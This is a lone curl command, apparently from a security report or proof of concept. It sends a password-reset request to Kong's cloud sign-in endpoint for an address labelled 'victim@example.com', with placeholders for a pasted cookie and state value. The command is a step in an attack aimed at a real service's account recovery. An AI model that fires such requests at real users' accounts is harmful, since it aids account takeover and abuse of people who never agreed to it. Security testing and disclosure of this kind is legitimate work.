```
curl -i -s -k -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Cookie: PASTE_FULL_COOKIE_HERE" \
  --data-urlencode "state=PASTE_STATE_HERE" \
  --data-urlencode "email=victim@example.com" \
  'https://signin.cloud.konghq.com/u/reset-password/request/Username-Password-Authentication?state=PASTE_STATE_HERE'

```
